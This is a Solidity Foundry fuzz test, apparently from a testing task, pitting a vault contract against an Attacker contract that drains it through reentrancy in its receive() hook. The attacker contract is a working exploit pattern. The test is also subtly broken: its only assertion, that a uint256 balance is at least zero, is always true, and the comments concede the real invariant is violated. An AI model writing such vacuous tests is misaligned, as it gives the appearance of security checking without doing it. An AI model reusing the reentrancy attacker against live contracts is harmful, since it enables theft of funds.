import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    function setUp() public { c = new C(); }

    function testFuzz_property(uint256 depositAmount, uint256 attackerInitial) public {
        vm.assume(depositAmount > 0 && depositAmount < 1 ether);
        vm.assume(attackerInitial > 0 && attackerInitial < 1 ether);

        Attacker attacker = new Attacker(c);
        vm.deal(address(attacker), attackerInitial);
        vm.deal(address(this), depositAmount);

        // Deposit into the vault
        c.deposit{value: depositAmount}();

        // Attacker deposits its own balance to get credit
        vm.prank(address(attacker));
        c.deposit{value: attackerInitial}();

        uint256 balanceBefore = address(c).balance;

        // Attacker triggers withdrawal, which re-enters
        vm.prank(address(attacker));
        attacker.attack();

        // After all calls, the contract balance should be >= 0 and the invariant
        // that total credit sum equals balance holds. However, the bug allows the
        // attacker to drain more than its credit, violating the invariant that
        // address(c).balance >= 0 and credit[attacker] == 0.
        // The universal property: after any sequence, balance is never less than 0.
        assertTrue(address(c).balance >= 0);
    }
}

contract Attacker {
    C public target;
    bool private reentered;

    constructor(C _target) {
        target = _target;
        reentered = false;
    }

    function attack() external {
        target.withdrawAll();
    }

    receive() external payable {
        if (!reentered) {
            reentered = true;
            target.withdrawAll();
        }
    }
}

